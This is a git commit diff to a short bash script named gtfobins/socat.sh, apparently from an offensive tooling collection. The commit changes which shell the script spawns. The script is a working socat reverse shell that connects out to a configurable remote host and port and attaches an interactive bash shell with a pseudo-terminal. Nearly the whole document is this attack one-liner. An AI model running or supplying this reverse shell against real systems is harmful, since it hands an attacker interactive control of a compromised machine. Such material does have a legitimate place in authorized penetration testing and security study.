7c1309e2193d8fb6f523fe28f3ad7a1222dea324
montysecurity <18372298+montysecurity@users.noreply.github.com>
2021-02-06 20:43:30 -0600

    Added socat

--- gtfobins/socat.sh
+++ gtfobins/socat.sh
@@ -1,5 +1,6 @@
 #!/bin/bash
 
+SHELL="/bin/bash"
 RHOST=0.0.0.0
 RPORT=12345
-socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
+socat tcp-connect:$RHOST:$RPORT exec:$SHELL,pty,stderr,setsid,sigint,sane
